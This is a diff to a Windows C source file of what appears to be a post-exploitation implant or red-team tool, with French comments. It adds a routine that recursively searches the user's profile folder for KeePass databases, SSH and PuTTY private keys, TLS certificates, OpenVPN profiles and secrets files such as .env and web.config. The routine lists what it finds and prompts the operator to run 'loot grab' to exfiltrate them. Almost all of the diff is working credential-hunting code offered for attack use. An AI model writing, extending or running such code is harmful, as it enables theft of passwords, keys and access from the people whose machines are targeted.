@@ -1,6 +1,8 @@
 #include "loot.h"
 #include <stdio.h>
 #include <string.h>
+#include <stdlib.h>
+#include <ctype.h>
 #include <tlhelp32.h>
 #include <shlobj.h>
 
@@ -290,6 +292,141 @@ int loot_grab(const char *filepath, char *output, size_t size) {
     }
 
     strcat(output, "\n[End of file]\n");
+
+    return LOOT_SUCCESS;
+}
+
+/**
+ * Vérifie si un nom de fichier correspond à un fichier sensible connu
+ */
+static int is_sensitive_filename(const char *filename) {
+    char lower[256] = {0};
+    size_t i;
+    for (i = 0; filename[i] && i < sizeof(lower) - 1; i++) {
+        lower[i] = (char)tolower((unsigned char)filename[i]);
+    }
+    lower[i] = '\0';
+    size_t flen = i;
+
+    // Extensions sensibles
+    const char *exts[] = {
+        ".kdbx", ".kdb",         // KeePass
+        ".ppk",                  // PuTTY private key
+        ".pem", ".pfx", ".p12",  // Certificats / clés TLS
+        ".ovpn",                 // OpenVPN
+        NULL
+    };
+    for (int j = 0; exts[j]; j++) {
+        size_t elen = strlen(exts[j]);
+        if (flen >= elen && strcmp(lower + flen - elen, exts[j]) == 0)
+            return 1;
+    }
+
+    // Noms contenant ces sous-chaînes (clés SSH)
+    const char *substrings[] = {
+        "id_rsa", "id_ed25519", "id_ecdsa", "id_dsa", NULL
+    };
+    for (int j = 0; substrings[j]; j++) {
+        if (strstr(lower, substrings[j]) != NULL)
+            return 1;
+    }
+
+    // Noms de fichiers exacts (insensible à la casse)
+    const char *exact[] = {
+        ".env", "web.config", "appsettings.json",
+        "credentials.xml", "secrets.json", NULL
+    };
+    for (int j = 0; exact[j]; j++) {
+        if (strcmp(lower, exact[j]) == 0)
+            return 1;
+    }
+
+    return 0;
+}
+
+/**
+ * Parcours récursif à la recherche de fichiers sensibles
+ */
+static void find_sensitive_recursive(const char *dir, char *output,
+                                     size_t *pos, size_t max_size,
+                                     int *count, int max_count, int depth) {
+    if (*count >= max_count || depth > 8) return;
+
+    WIN32_FIND_DATAA fd;
+    char search_path[MAX_PATH];
+    snprintf(search_path, sizeof(search_path), "%s\\*", dir);
+
+    HANDLE hFind = FindFirstFileA(search_path, &fd);
+    if (hFind == INVALID_HANDLE_VALUE) return;
+
+    do {
+        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
+            continue;
+
+        char full_path[MAX_PATH];
+        snprintf(full_path, sizeof(full_path), "%s\\%s", dir, fd.cFileName);
+
+        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+            // Ignorer les dossiers système / volumineux
+            const char *skip[] = {
+                "Windows", "Program Files", "node_modules", "$", NULL
+            };
+            int should_skip = 0;
+            for (int i = 0; skip[i]; i++) {
+                if (strstr(fd.cFileName, skip[i]) != NULL) {
+                    should_skip = 1;
+                    break;
+                }
+            }
+            if (!should_skip)
+                find_sensitive_recursive(full_path, output, pos, max_size,
+                                         count, max_count, depth + 1);
+        } else {
+            if (is_sensitive_filename(fd.cFileName)) {
+                LARGE_INTEGER li;
+                li.LowPart = fd.nFileSizeLow;
+                li.HighPart = fd.nFileSizeHigh;
+                int len = snprintf(output + *pos, max_size - *pos,
+                                   "  [%lldB] %s\n", li.QuadPart, full_path);
+                if (len > 0) *pos += len;
+                (*count)++;
+            }
+        }
+    } while (FindNextFileA(hFind, &fd) && *pos < max_size - 200);
+
+    FindClose(hFind);
+}
+
+/**
+ * Recherche de fichiers sensibles connus (KeePass, SSH, certs, configs)
+ */
+int loot_sensitive(char *output, size_t size) {
+    output[0] = '\0';
+    size_t pos = 0;
+    int count = 0;
+
+    pos += snprintf(output + pos, size - pos,
+                    "[Sensitive File Hunt]\n"
+                    "═══════════════════════════════════════════\n"
+                    "Targets: .kdbx .ppk id_rsa .pem .pfx .ovpn .env ...\n\n");
+
+    char profile[MAX_PATH];
+    get_user_directory(profile, sizeof(profile), CSIDL_PROFILE);
+
+    if (profile[0]) {
+        find_sensitive_recursive(profile, output, &pos, size, &count, 100, 0);
+    }
+
+    if (count == 0) {
+        pos += snprintf(output + pos, size - pos, "[-] No sensitive files found\n");
+    } else {
+        pos += snprintf(output + pos, size - pos,
+                        "\n[+] Found %d sensitive file(s)\n"
+                        "[*] Use 'loot grab <path>' to exfiltrate\n", count);
+    }
+
+    pos += snprintf(output + pos, size - pos,
+                    "═══════════════════════════════════════════\n");
 
     return LOOT_SUCCESS;
 }
